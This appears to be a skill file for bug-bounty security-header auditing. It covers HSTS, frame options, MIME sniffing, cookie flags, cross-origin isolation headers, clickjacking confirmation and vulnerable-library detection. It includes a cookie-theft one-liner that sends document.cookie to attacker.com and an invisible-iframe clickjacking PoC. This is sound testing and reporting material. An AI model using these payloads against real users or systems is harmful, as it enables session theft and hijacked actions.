---
name: security-headers-testing
description: HTTP security-header and browser-isolation-policy auditing — checking every response for the response headers that opt a page into browser-enforced defenses (X-Frame-Options/frame-ancestors for clickjacking, Strict-Transport-Security for HTTPS enforcement, X-Content-Type-Options for MIME-sniffing, Cookie Secure/HttpOnly/SameSite flags, and Cross-Origin-Opener-Policy/Cross-Origin-Embedder-Policy/Cross-Origin-Resource-Policy for cross-origin isolation) — plus the clickjacking PoC and vulnerable-client-side-library detection that ride alongside this same pass. Use this during Phase 3 (Vulnerability Testing — Client-side) of bughunting-workflow on every target as a cheap, near-zero-effort parallel check — one `curl -I` reveals most of this class at once. Also trigger on mentions of clickjacking, X-Frame-Options, frame-ancestors, HSTS, Strict-Transport-Security, X-Content-Type-Options, MIME sniffing, cookie Secure/HttpOnly flag, SameSite, COOP, COEP, CORP, or missing security headers.
---

# HTTP Security Headers & Clickjacking Testing

General technique library for auditing a target's response-header security posture. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* header, isolation policy, or exploitation angle than what's already recorded.

## Core theory

A whole class of browser-side attacks (clickjacking, MIME-confusion content-type attacks, cross-origin Spectre-style side channels, cookie theft via non-HTTPS transport or JS access) exist only because the *browser* enforces a defense — but only when the server explicitly opts in via a response header. No header present means no defense enabled, by default, on every browser that respects the header's absence as "not configured" rather than "secure by default." This makes the whole class unusually cheap to check: a single `curl -I` (or a Burp/browser DevTools look at the Network tab's Response Headers) against any page reveals most of it in one shot, with no active payload needed to *find* the gap — only to demonstrate impact once found.

Distinguish this skill from the vuln classes it sits next to:
- **`csp-misconfig-xss-testing`** — covers CSP specifically as an XSS-mitigation-bypass problem (does the CSP block a DOM-XSS payload that's already been found). This skill covers CSP's *presence/absence* as one line item in the broader header sweep, and owns the rest of the header list CSP doesn't touch (frame options, HSTS, MIME options, cookie flags, cross-origin isolation).
- **`cors-misconfig-testing`** — covers `Access-Control-Allow-Origin`/`-Allow-Credentials` reflection specifically. This skill covers the *other* cross-origin isolation headers (COOP/COEP/CORP) that address a related but distinct threat model (Spectre-class side-channel leaks between isolated browsing contexts, not credentialed-fetch data theft).
- **`session-auth-testing`** — covers session/token *logic* flaws (fixation, predictable tokens, missing expiry). This skill covers the cookie's *header-level* security flags (`Secure`, `HttpOnly`, `SameSite`, `Path`) — a perfectly logic-sound session token is still stealable if the cookie carrying it lacks `HttpOnly` (readable via any XSS) or `Secure` (sent in cleartext over any accidental HTTP request).

## Baseline sweep: one request per host, check every header at once

```bash
curl -sI https://target.com
```
Or across a full subdomain list at once (pairs naturally with any `httpx`-based Phase 1 sweep from `recon-scanning-toolkit`):
```bash
cat subs.txt | httpx-toolkit -silent -sc -title -irh   # -irh dumps response headers inline for grepping
```

Check for presence/correctness of each, independently — a target can be missing some and have others correctly configured, so don't stop checking after the first miss:

| Header | What's missing without it | Correct value to expect |
|---|---|---|
| `X-Frame-Options` | Clickjacking protection | `DENY` or `SAMEORIGIN` (legacy but still widely checked) |
| `Content-Security-Policy: frame-ancestors` | Clickjacking protection (modern replacement/supplement for `X-Frame-Options`) | `frame-ancestors 'self'` or an explicit allowlist — note a page can have `X-Frame-Options` missing but still be protected if `frame-ancestors` is set (or vice versa), so check both before concluding clickjacking is exploitable |
| `Strict-Transport-Security` | Forces HTTPS on every subsequent visit; without it, a single accidental/attacker-forced HTTP request is interceptable | present, with a meaningful `max-age` (not a token value like `max-age=0`) |
| `X-Content-Type-Options` | MIME-sniffing protection — without it, a browser may execute a file as a different type than the server declared (e.g. render an "image" upload as HTML/JS) | `nosniff` |
| `Content-Security-Policy` | Baseline XSS mitigation | see `csp-misconfig-xss-testing` for the full weak-CSP/bypass methodology once one exists |
| `Cross-Origin-Opener-Policy` | Isolates the page's browsing context group from cross-origin popups/openers — mitigates Spectre-class side channels and some tab-nabbing/reverse-tabnabbing vectors | `same-origin` |
| `Cross-Origin-Embedder-Policy` | Required alongside COOP for full "cross-origin isolation," which some powerful browser APIs (`SharedArrayBuffer`, precise timers) require and which also blocks Spectre-class attacks | `require-corp` or `credentialless` |
| `Cross-Origin-Resource-Policy` | Controls whether *other* origins can load this resource at all (image/script/fetch) — protects against being embedded as a side-channel oracle by an attacker page | `same-origin` or `same-site` depending on the resource's legitimate cross-origin needs |
| `Set-Cookie: ... Secure` | Without it, the cookie is sent over plain HTTP too — interceptable by any MITM position (open WiFi, ARP spoof, downgraded request) | present on every session/auth cookie |
| `Set-Cookie: ... HttpOnly` | Without it, any XSS (even a low-severity one elsewhere on the same origin) can read the cookie via `document.cookie` and exfiltrate the session directly | present on every session/auth cookie |
| `Set-Cookie: ... SameSite` | Without `Lax`/`Strict`, the cookie rides along on cross-site requests — a CSRF-adjacent exposure | `Lax` at minimum, `Strict` for the most sensitive actions |

**`SameSite` values, precisely (don't just check "present"):**
- Unset → modern browsers default to `Lax` on your behalf, but don't rely on the default: an older client, a misconfigured proxy, or an explicit `SameSite=None` without `Secure` can all still leak it — always confirm the actual header value, never infer it from browser defaults.
- `Lax` → blocks the cookie on cross-site sub-requests (images, iframes, fetch/XHR) but still allows it on top-level cross-site *navigation* via GET (a link click, a form `method="GET"`) — cross-site GET-based state changes are still exploitable even with `Lax` set.
- `Strict` → blocks the cookie on every cross-site request, including top-level navigation — the only value that fully closes CSRF via cookie-riding, at the cost of breaking flows like clicking an emailed link while already logged in (the cookie won't ride along on that first navigation).
- `None` → cookie rides along on every cross-site request; modern browsers *require* `Secure` to be set alongside it or reject the cookie outright — if you see `SameSite=None` without `Secure`, that's a distinct, independently-reportable misconfiguration on top of the SameSite exposure itself.

**CSRF exploitability checklist (walk all four before calling a missing/weak `SameSite` a reportable CSRF, not just "flag absent"):**
1. **State-changing action exists** at the target endpoint (password/email change, fund transfer, privilege grant) — CSRF onto a read-only/informational endpoint isn't reportable.
2. **Browser-forwarded auth** — the endpoint authenticates via cookie (or HTTP Basic) that the browser attaches automatically, not solely via a header/token the attacker's cross-site page can't set.
3. **No unpredictable value required** — no CSRF token, no re-entered password/current-value confirmation gating the action.
4. **No blocking pre-flight CORS check** — if the request needs a custom header or content-type that triggers a CORS preflight, and the server's CORS policy rejects the cross-origin preflight, the browser never sends the actual request at all, killing the attack before the cookie/SameSite question even matters.

**Cookie-theft PoC payload (once any XSS sink is confirmed on the origin and `HttpOnly` is absent):**
```javascript
location.href="https://attacker.com/c?c="+document.cookie;
```
Pair this one-liner with any existing XSS finding to turn a "missing `HttpOnly`" header note into a demonstrated, reportable session-hijack rather than a theoretical flag check.

**Why `Secure` and `HttpOnly` don't substitute for each other:** `HttpOnly` stops a malicious script from *reading* the cookie via `document.cookie` — it does nothing about the cookie being sent in cleartext over an accidental/downgraded plain-HTTP request. `Secure` stops the cleartext-transport leak — it does nothing about a same-origin XSS reading the cookie via JS before ever sending it anywhere. Each flag closes a gap the other one doesn't touch; report both independently rather than treating one as sufficient defense-in-depth for the other.

## Clickjacking: confirming exploitability, not just the missing header

A missing `X-Frame-Options`/`frame-ancestors` is not by itself proof of exploitable clickjacking — confirm the page actually renders inside a frame and that there's a real UI action worth hijacking:

```html
<html>
<head><title>Clickjacking PoC</title></head>
<body>
  <iframe src="https://target.com" style="opacity:0.0001; position:absolute; top:0; left:0; width:100%; height:100%; z-index:2;"></iframe>
  <div style="position:absolute; top:200px; left:300px; z-index:1;">Click here to claim your prize!</div>
</body>
</html>
```
1. Host this locally or on any throwaway domain, open it in a browser, confirm the target page actually renders inside the invisible iframe (some apps set framing protection via JS frame-busting instead of a header — check for that before concluding the header's absence means the page is actually frameable).
2. Align the invisible iframe's interactive element (a "Delete account," "Change email," "Transfer funds" button — anything state-changing, not just informational) under the visible decoy content.
3. Impact framing depends entirely on *what* the hijacked click does — clickjacking onto a purely cosmetic action isn't a reportable finding; clickjacking onto a privileged/state-changing action (account takeover via email-change, unauthorized fund transfer, forced like/follow/subscribe on a social feature) is.

## Vulnerable client-side library detection (rides along on the same pass)

Not a header check, but the same "cheap, passive, one sweep per target" category — check the JS libraries a page actually ships for known CVEs before assuming a modern-looking frontend is safe:
```bash
npm audit                      # if you have access to the target's package.json/lockfile (rare for a black-box target, common for a source-available/vibe-coded one)
```
- **Retire.js** (browser extension or CLI) — passively scans a page's loaded JS for known-vulnerable library versions without needing source access, the practical black-box equivalent of `npm audit`.
- **Burp DOM Invader** — flags DOM XSS sinks and vulnerable-library usage while browsing the target normally through Burp's proxy.
- Cross-reference `file-upload-testing`'s PDF.js CVE-2024-4367 entry for a worked example of exactly this pattern (known-vulnerable client-side library, fingerprint via Wappalyzer/Retire.js, exploit via a public PoC) — treat any flagged library the same way: check the CVE, confirm the version, try the published PoC.

## Impact framing for report

Don't report "header X is missing" alone — pair each missing header with the specific attack it enables and, where possible, a working PoC:
- Missing `X-Frame-Options`/`frame-ancestors` → clickjacking PoC (above) targeting a real state-changing action.
- Missing `Strict-Transport-Security` → demonstrate (or reason about) a MITM position downgrading a request to HTTP and capturing the session cookie in cleartext.
- Missing cookie `Secure`/`HttpOnly` → pair with any existing XSS finding (even a low-severity one) to show session-cookie theft becomes possible; on its own, a missing flag with no XSS anywhere on the origin is a lower-severity "defense in depth" finding, not a standalone critical.
- Missing `X-Content-Type-Options` → demonstrate a file upload/serving path where a non-HTML file type gets sniffed and rendered as HTML/JS (chain with `file-upload-testing`).
- Missing COOP/COEP/CORP → generally lower individual severity (Spectre-class side channels are hard to demonstrate concretely in a bug bounty PoC) — report as defense-in-depth unless a concrete cross-origin data leak can be shown.

## Recorded techniques

### 1. Full response-header + clickjacking + vulnerable-library sweep on a static website (baseline)
Source: [20+ Vulnerabilities in a Static Website](https://saurabh-jain.medium.com/20-vulnerabilities-in-a-static-website-2f32a4902377)

**Where:** every target, including — deliberately called out by this source — a purely *static* site (no backend logic, no database) that a hunter might otherwise dismiss as low-value; static hosting (Netlify, Vercel, S3+CloudFront, GitHub Pages) still serves real HTTP responses with real (or missing) security headers, ships real client-side JS with real dependency versions, and sets real cookies for any analytics/auth-adjacent functionality — none of that requires a dynamic backend to be exploitable.

**Root cause:** these headers are opt-in, not default-secure, and static-site generators/CDN defaults frequently ship with none of them configured out of the box — the deploy pipeline (Netlify/Vercel config, S3 bucket policy, CloudFront distribution behavior) is where they'd need to be added, and teams shipping a "just a marketing site" often skip that step entirely since it doesn't feel like "the app."

**Exploit steps:** run the baseline `curl -sI` sweep above against the target (and every subdomain, since static marketing sites/docs sites/staging environments often have *worse* header hygiene than the main authenticated app); for any missing frame-protection header, build and test the clickjacking PoC against a real state-changing action if one exists on the site (contact form submission, newsletter signup, any embedded auth widget); separately run Retire.js/Wappalyzer against the page's loaded JS for known-CVE libraries.

**Impact framing for report:** see the Impact framing section above — the key point specific to static sites is not to let "it's just a static site" become an excuse to under-report; a clickjackable auth widget or a vulnerable JS library with a known RCE/XSS CVE is exactly as reportable on a static site as anywhere else, since the browser-side attack surface doesn't care what generated the HTML.

**Generalize note:** this source's other ~15 items (directory/file exposure, `.git`/backup-file discovery, S3/CloudFront misconfiguration, config-file leaks, staging-environment discovery, CORS wildcard, open redirect, DOM XSS, EXIF/metadata OSINT) are already covered in more depth by `recon-scanning-toolkit`, `github-recon-testing`, `cloud-storage-bucket-testing`, `cors-misconfig-testing`, `open-redirect-testing`, and `csp-misconfig-xss-testing` — cross-reference those rather than re-deriving them here; this skill exists specifically for the header/clickjacking/cross-origin-isolation subset those skills don't own.

<!-- Add new recorded techniques below this line as new security-header/clickjacking writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
